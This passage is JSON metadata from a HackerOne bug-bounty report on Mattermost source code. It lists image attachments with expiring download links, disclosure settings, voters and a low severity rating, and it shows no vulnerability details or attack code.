9DoycIZmWr9UREuZQ2M5CKYV584Gr8AiuOVdKIhwRK6b6AY8K0eliXMlsrHL771mFBPGYLHjMweBxhHQzpSG0B41tVPuCoVIpaFpU5R02GrCjvW5kH5%2Flt%2BIe0OP%2B2pnJ24qjVBcxAGiNSigkrtUMmOtMCIOs%2Fn9FWQfq8YvEfTuNpDa8%2Fq6ODNTJFAusMJ8OFkAMTmfEKMEnQqupoq3LQWgvyhmhnsQttRQbw%2F3ptn6xmeMT93NzGxO9EGyuYbSsJjtVvsKz3zyylPTorWlzbgItq%2FEqmLKW3o%2BjV8iNxr7Z8871slspSL31o8IIKet9QuxYw0LEctmAfjaVXwkv%2F5jYoanq6I5q0v5b2NLA2TAsdxqKtzgy1Mwwwk35UHr0Da3knQlwdNhrwK6Ae2w2k41a%2Fy38ee%2FY1BTMkW6a9uLubBh8KWxhy%2FpWbcSO9emVrSfvxcL7ufE%2FdM%2FkJJkhEb6uQfLM5ySxvj4qWyVCNS7ZHVba1Awl4TGGklQGJ1sTJpWUEuXXSgpUjA6CwH9MdsMOYdk8spSfolISDgIhIA5ZmuNgydVITvTGDTvPRq4URdPcf8PglGIGYvB5Fg9gDRnSVBFhLOYfkrAKCEfGCx8NP6RkBnBSH8Vom4294LU2%2B6jpYoMDqWZwKLymfeH%2B2Ly0JxQtS6w7wWCll7774aFeE6WzSfcr8NrSlRzuknYZAfx%2FU8wrJW7xgY6sQFfjMR5GNfYKRzq3e2SZ4aV2ALT5cAq6qadBqqo5IXAugW3wFm3H4UCjPFMWuXw7kBa7261tkMA4lz9PtSK0dHwEUXAnotQfaCf9kwHyr1L0OVZ5yguv%2FCRrzXXUvYbqhQuTSXm4wAdzabaA5tjTkNJBV%2Bs8aR8iPFpfYv8ka7DLsuA8ks%2BUY7h1GsAJzVvGfO2LIsS%2F5pK27ULuiUYk7dQrn3KbZylZnnRvrpMIZ2J9O4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f5ddfee945ee25828c2fa27e31e8b9abb91f9ecb9fcd26bc3475d39de979353e",
      "file_size": 104544,
      "type": "image/png",
      "moderated": false
    },
    {
      "id": 3339088,
      "file_name": "image.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8zpqk9zvefittjc8h68lvrunezfu?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5H4AV6WS%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T180525Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIAum5gA9n0OhwNjaJnXmgaOH356uPjfQtutefi9s%2FVkeAiEAmU8uKGEAWtTFZtjIrKTW3793xxguLKe%2FmSxaH8ECZRcquwUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO%2FfHip2wAKwSj7BkyqPBTlFlyss9iCw9mK7SQFAuBHDDDXXX2DjNetK7kFwZijWIL6LbNUuji4J354mT6D8ToTjsQqkBhPxB6YQr4Z3WH8lOVOgx27vS5ubetT4kUp1QFhcjp0vaQqcMWm3SxSYdJjE%2FnOMbUenHrrY9t%2BlaBMUYd1c46KqZsXk9DoycIZmWr9UREuZQ2M5CKYV584Gr8AiuOVdKIhwRK6b6AY8K0eliXMlsrHL771mFBPGYLHjMweBxhHQzpSG0B41tVPuCoVIpaFpU5R02GrCjvW5kH5%2Flt%2BIe0OP%2B2pnJ24qjVBcxAGiNSigkrtUMmOtMCIOs%2Fn9FWQfq8YvEfTuNpDa8%2Fq6ODNTJFAusMJ8OFkAMTmfEKMEnQqupoq3LQWgvyhmhnsQttRQbw%2F3ptn6xmeMT93NzGxO9EGyuYbSsJjtVvsKz3zyylPTorWlzbgItq%2FEqmLKW3o%2BjV8iNxr7Z8871slspSL31o8IIKet9QuxYw0LEctmAfjaVXwkv%2F5jYoanq6I5q0v5b2NLA2TAsdxqKtzgy1Mwwwk35UHr0Da3knQlwdNhrwK6Ae2w2k41a%2Fy38ee%2FY1BTMkW6a9uLubBh8KWxhy%2FpWbcSO9emVrSfvxcL7ufE%2FdM%2FkJJkhEb6uQfLM5ySxvj4qWyVCNS7ZHVba1Awl4TGGklQGJ1sTJpWUEuXXSgpUjA6CwH9MdsMOYdk8spSfolISDgIhIA5ZmuNgydVITvTGDTvPRq4URdPcf8PglGIGYvB5Fg9gDRnSVBFhLOYfkrAKCEfGCx8NP6RkBnBSH8Vom4294LU2%2B6jpYoMDqWZwKLymfeH%2B2Ly0JxQtS6w7wWCll7774aFeE6WzSfcr8NrSlRzuknYZAfx%2FU8wrJW7xgY6sQFfjMR5GNfYKRzq3e2SZ4aV2ALT5cAq6qadBqqo5IXAugW3wFm3H4UCjPFMWuXw7kBa7261tkMA4lz9PtSK0dHwEUXAnotQfaCf9kwHyr1L0OVZ5yguv%2FCRrzXXUvYbqhQuTSXm4wAdzabaA5tjTkNJBV%2Bs8aR8iPFpfYv8ka7DLsuA8ks%2BUY7h1GsAJzVvGfO2LIsS%2F5pK27ULuiUYk7dQrn3KbZylZnnRvrpMIZ2J9O4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=44c0a268071a3f594a3590e6aa17ffb5cd4d7f792d9e7f7fc74c7c733260dca5",
      "file_size": 112414,
      "type": "image/png",
      "moderated": false
    },
    {
      "id": 3339089,
      "file_name": "image.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cbswr0mkiyvhshg6tv8sxswgxwrz?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5H4AV6WS%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T180525Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIAum5gA9n0OhwNjaJnXmgaOH356uPjfQtutefi9s%2FVkeAiEAmU8uKGEAWtTFZtjIrKTW3793xxguLKe%2FmSxaH8ECZRcquwUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO%2FfHip2wAKwSj7BkyqPBTlFlyss9iCw9mK7SQFAuBHDDDXXX2DjNetK7kFwZijWIL6LbNUuji4J354mT6D8ToTjsQqkBhPxB6YQr4Z3WH8lOVOgx27vS5ubetT4kUp1QFhcjp0vaQqcMWm3SxSYdJjE%2FnOMbUenHrrY9t%2BlaBMUYd1c46KqZsXk9DoycIZmWr9UREuZQ2M5CKYV584Gr8AiuOVdKIhwRK6b6AY8K0eliXMlsrHL771mFBPGYLHjMweBxhHQzpSG0B41tVPuCoVIpaFpU5R02GrCjvW5kH5%2Flt%2BIe0OP%2B2pnJ24qjVBcxAGiNSigkrtUMmOtMCIOs%2Fn9FWQfq8YvEfTuNpDa8%2Fq6ODNTJFAusMJ8OFkAMTmfEKMEnQqupoq3LQWgvyhmhnsQttRQbw%2F3ptn6xmeMT93NzGxO9EGyuYbSsJjtVvsKz3zyylPTorWlzbgItq%2FEqmLKW3o%2BjV8iNxr7Z8871slspSL31o8IIKet9QuxYw0LEctmAfjaVXwkv%2F5jYoanq6I5q0v5b2NLA2TAsdxqKtzgy1Mwwwk35UHr0Da3knQlwdNhrwK6Ae2w2k41a%2Fy38ee%2FY1BTMkW6a9uLubBh8KWxhy%2FpWbcSO9emVrSfvxcL7ufE%2FdM%2FkJJkhEb6uQfLM5ySxvj4qWyVCNS7ZHVba1Awl4TGGklQGJ1sTJpWUEuXXSgpUjA6CwH9MdsMOYdk8spSfolISDgIhIA5ZmuNgydVITvTGDTvPRq4URdPcf8PglGIGYvB5Fg9gDRnSVBFhLOYfkrAKCEfGCx8NP6RkBnBSH8Vom4294LU2%2B6jpYoMDqWZwKLymfeH%2B2Ly0JxQtS6w7wWCll7774aFeE6WzSfcr8NrSlRzuknYZAfx%2FU8wrJW7xgY6sQFfjMR5GNfYKRzq3e2SZ4aV2ALT5cAq6qadBqqo5IXAugW3wFm3H4UCjPFMWuXw7kBa7261tkMA4lz9PtSK0dHwEUXAnotQfaCf9kwHyr1L0OVZ5yguv%2FCRrzXXUvYbqhQuTSXm4wAdzabaA5tjTkNJBV%2Bs8aR8iPFpfYv8ka7DLsuA8ks%2BUY7h1GsAJzVvGfO2LIsS%2F5pK27ULuiUYk7dQrn3KbZylZnnRvrpMIZ2J9O4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c18275aa775b66ee380959718ac0c9430fdc156b11f70dd0cfffedd1f35a84bb",
      "file_size": 96216,
      "type": "image/png",
      "moderated": false
    }
  ],
  "allow_singular_disclosure_at": "2024-10-27T07:43:31.839Z",
  "allow_singular_disclosure_after": -28376513.791127887,
  "singular_disclosure_allowed": true,
  "vote_count": 39,
  "voters": [
    "k0ns0l",
    "zy9ard3",
    "anonxr",
    "d3f7ult",
    "2026",
    "thalaivar304",
    "spaghettisec",
    "hundredpercent",
    "0xleonidas",
    "mr-alienx-kurd",
    "and 29 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 181349,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Mattermost Source Code",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
